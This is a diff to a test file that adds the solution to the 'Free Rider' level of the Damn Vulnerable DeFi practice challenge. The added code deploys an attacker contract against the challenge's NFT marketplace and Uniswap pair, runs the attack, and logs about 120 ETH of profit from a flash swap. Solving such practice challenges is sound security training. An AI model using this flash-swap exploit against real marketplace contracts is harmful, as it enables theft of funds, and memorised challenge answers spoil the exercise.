@@ -105,6 +105,26 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Deploy evil contract
+        // https://medium.com/@juanxaviervalverde/damn-vulnerable-defi-free-rider-level-10-solution-e39fc43296c7
+        this.attackerContract = await (
+            await ethers.getContractFactory('FreeRiderAttacker', attacker)
+        ).deploy(
+            this.nft.address,
+            this.weth.address,
+            this.uniswapPair.address,
+            this.marketplace.address,
+            this.buyerContract.address
+        )
+
+        // Attack
+        await this.attackerContract.connect(attacker).attack(NFT_PRICE)
+
+        // Attacker balance = 120 ETH
+        // NFT transfers = (6 NFTs * 15 ETH ) - 15 WETH of flash swap = 75 ETH
+        // 45 ETH (Payout) + 75 ETH (NFT transfers) = 120 ETH
+        console.log('Attacker ETH balance:', String(await ethers.provider.getBalance(attacker.address)))
+
     });
 
     after(async function () {
